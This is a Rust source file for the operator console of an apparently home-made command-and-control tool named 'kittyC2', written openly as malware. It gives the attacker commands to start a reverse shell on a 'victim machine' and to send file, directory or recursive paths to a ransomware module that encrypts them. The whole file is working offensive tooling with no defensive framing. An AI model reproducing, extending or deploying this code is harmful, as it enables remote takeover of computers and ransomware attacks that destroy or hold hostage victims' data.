use std::{sync::Arc, time::Duration};

use shared::{encrypted_write_from_key, ControlCode, ControlPacket, DataPacket, ModuleType};
use tokio::{io::{self, AsyncReadExt, AsyncWriteExt}, net::tcp::OwnedWriteHalf, sync::{mpsc::{self, Receiver}, Mutex}, time::sleep};
use tokio_util::sync::CancellationToken;

use crate::{Connection, SRV_CMDS_GAP};

const CONN_CMDS: [(&str, &str); 4] = [("start shell", "spawn an interactable shell on the victim machine"),
                                      ("encrypt", "enter encrypt mode to encrypt passed files/directories on the victim file system"),
                                      ("help", "shows this help message"),
                                      ("exit", "exit interacting with connection, does not terminate the connection")];
pub mod encryption;

pub async fn connection_handler(connection: &Connection) -> std::io::Result<()> {

    let prefix: &str = &format!("\x1b[38;5;207mkittyC2 [{}] $ \x1b[0m", connection.writer.lock().await.as_ref().peer_addr().unwrap());
    let mut stdout = io::stdout();

    loop {
        let mut input = [0; 1024];
        stdout.write(prefix.as_bytes()).await?;
        stdout.flush().await?;
        let n = io::stdin().read(&mut input).await?;
        
        match &input[..n] {
            b"start shell\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::ReverseShell) {
                    let data = ControlPacket {
                        module_type: ModuleType::ReverseShell,
                        control_code: ControlCode::Start
                    };
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::ReverseShell).unwrap().lock().await = sx;
                    encrypted_write_from_key(connection.writer.clone(), &connection.key, data).await?;
                    reverse_shell_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"ReverseShell Module is not present for this connection").await?;
                }
            }

            b"encrypt\r\n" => {
                if connection.modules_map.contains_key(&ModuleType::RansomWare) {
                    let (sx, rx) = mpsc::channel(64);
                    *connection.modules_map.get(&ModuleType::RansomWare).unwrap().lock().await = sx;         
                    encryption_handler(rx, connection.writer.clone(), &connection.key).await?;
                } else {
                    io::stdout().write_all(b"RansomWare Module not present").await?;
                }
            }

            b"help\r\n" => {
                stdout.write(b"CONNECTION COMMANDS:\n\n").await?;
                for (command, info) in CONN_CMDS {
                    stdout.write(format!("    {}{}{}\n\n", command, " ".repeat(SRV_CMDS_GAP - command.len()), info).as_bytes()).await?;
                }
                stdout.write(b"\n").await?;
                stdout.flush().await?;
            }

            b"exit\r\n" => {
                return Ok(())
            }

            _ => ()
        }

    }
} 

pub async fn reverse_shell_handler(mut rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {
    let token = CancellationToken::new();
    let token2 = token.clone();

    //STDOUT + STDERR
    let reader_handle = tokio::spawn(async move {
        loop {
            tokio::select! {
                Some(data) = rx.recv() => {
                    io::stderr().write(&data).await?;
                    io::stderr().flush().await?;
                }
                _ = token.cancelled() => {
                    break
                }
            }
        }
        Ok::<(), std::io::Error>(())
    });

    //STDIN
    loop {
        let mut buf = [0; 1024];
        let n = io::stdin().read(&mut buf).await?;
        let data = DataPacket {
            module_type: ModuleType::ReverseShell,
            data: buf[..n].to_vec()
        };
        encrypted_write_from_key(writer.clone(), key, data).await?;
        if &buf[..n] == "exit\r\n".as_bytes() {
            sleep(Duration::from_millis(50)).await;
            eprint!("\x1B[2J\x1B[1;1H");
            eprint!("Terminal Closed...");
            eprint!("\n");
            token2.cancel();
            io::stderr().flush().await?;
            sleep(Duration::from_millis(50)).await;
            break
        }
    }
    reader_handle.await??;
    Ok(())
}

pub async fn encryption_handler(mut _rx: Receiver<Vec<u8>>, writer: Arc<Mutex<OwnedWriteHalf>>, key: &[u8; 32]) -> std::io::Result<()> {

    let prefix: &str = &format!("\x1b[38;5;207mkittyC2 [{}] [encrypt] $ \x1b[0m", writer.lock().await.as_ref().peer_addr().unwrap());
    let mut stdout = io::stdout();
    
    stdout.write(b"now in ENCRYPT mode, write to stdin one of the available commands:\n 
    -f <FILEPATHS> for file(s), \n
    -d <DIRECTORY> to encrypt the contents of a directory\n
    -rd <DIRECTORY> to recursively encrypt the contents of a directory\n
    -exit to leave ENCRYPT mode\n\n").await?;
    stdout.flush().await?;
    loop {
        let mut buf = [0; 1024];
        stdout.write(prefix.as_bytes()).await?;
        stdout.flush().await?;
        let n = io::stdin().read(&mut buf).await?;

        if &buf[..n] == b"exit\r\n" {
            break
        }
        if n < 11 {
            println!("enter a longer path");
            continue
        }

        if &buf[..8] != b"encrypt " {
            println!("wrong format for command");
            continue
        }
        let data = DataPacket {
            module_type: ModuleType::RansomWare,
            data: buf[8..n-2].to_vec()
        };
        encrypted_write_from_key(writer.clone(), key, data).await?;

    }
    Ok(())
}



